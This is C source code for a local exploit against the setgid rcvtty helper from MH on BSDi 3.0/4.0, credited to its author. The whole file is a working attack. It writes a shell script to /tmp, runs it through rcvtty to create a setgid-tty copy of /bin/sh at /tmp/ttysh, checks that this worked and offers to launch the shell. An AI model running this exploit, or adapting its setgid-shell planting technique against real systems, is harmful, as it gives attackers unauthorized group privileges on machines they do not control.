/* (BSDi3.0/4.0)rcvtty[mh] local exploit, by
   v9[v9@fakehalo.org].  gives gid=4(tty).

   info: found/exploit by: v9[v9@fakehalo.org].
*/
#define PATH      "/usr/contrib/mh/lib/rcvtty"
#define MAKESHELL "/tmp/mksh.sh"
#define SGIDSHELL "/tmp/ttysh"
#define GIDTTY    4
#include <stdio.h>
#include <sys/stat.h>
main(){
 char cmd[256],in[0];
 struct stat mod1,mod2;
 FILE *sgidexec;
 fprintf(stderr,"[ (BSDi3.0/4.0)rcvtty[mh] local"
 " exploit, by v9[v9@fakehalo.org ]. ]\n\n");
 if(stat(PATH,&mod1)){
  fprintf(stderr,"[!] failed, %s doesnt appear to"
  " exist.\n",PATH);
  exit(1);
 }
 else
 if(mod1.st_mode==34285&&mod1.st_gid==GIDTTY){
  fprintf(stderr,"[*] %s appears to be setgid"
  " tty(%d).\n",PATH,GIDTTY);
 }
 else{
  fprintf(stderr,"[!] failed, %s isn't setgid"
  " tty(%d).\n",PATH,GIDTTY);
  exit(1);
 }
 fprintf(stderr,"[*] now making shell script to"
 " execute.\n");
 unlink(MAKESHELL);
 sgidexec=fopen(MAKESHELL,"w");
 fprintf(sgidexec,"#!/bin/sh\n");
 fprintf(sgidexec,"cp /bin/sh %s\n",SGIDSHELL);
 fprintf(sgidexec,"chgrp %d"
 " %s\n",GIDTTY,SGIDSHELL);
 fprintf(sgidexec,"chmod 2755 %s\n",SGIDSHELL);
 fclose(sgidexec);
 chmod(MAKESHELL,33261);
 fprintf(stderr,"[*] done, now building and"
 " executing the command line.\n");
 snprintf(cmd,sizeof(cmd),"echo yes | %s %s"
 " 1>/dev/null 2>&1",PATH,MAKESHELL);
 system(cmd);
 unlink(MAKESHELL);
 fprintf(stderr,"[*] done, now checking for"
 " success.\n");
 if(stat(SGIDSHELL,&mod2)){
  fprintf(stderr,"[!] failed, %s doesn't"
  " exist.\n",SGIDSHELL);
  exit(1);
 }
 else
if(mod2.st_mode==34285&&mod2.st_gid==GIDTTY){
  fprintf(stderr,"[*] success, %s is now setgid"
  " tty(%d).\n",SGIDSHELL,GIDTTY);
 }
 else{
  fprintf(stderr,"[!] failed, %s isn't setgid"
  " tty(%d).\n",SGIDSHELL,GIDTTY);
  exit(1);
 }
 fprintf(stderr,"[*] finished, everything"
 " appeared to have gone successful.\n");
 fprintf(stderr,"[?] do you wish to enter the"
 " sgidshell now(y/n)?: ");
 scanf("%s",in);
 if(in[0]!=0x59&&in[0]!=0x79){
  printf("[*] ok, aborting execution, the shell"
  " is: %s.\n",SGIDSHELL);
 }
 else{
  printf("[*] ok, executing shell(%s) now.\n",
  SGIDSHELL);
  execl(SGIDSHELL,SGIDSHELL,0);
 }
 exit(0);
}

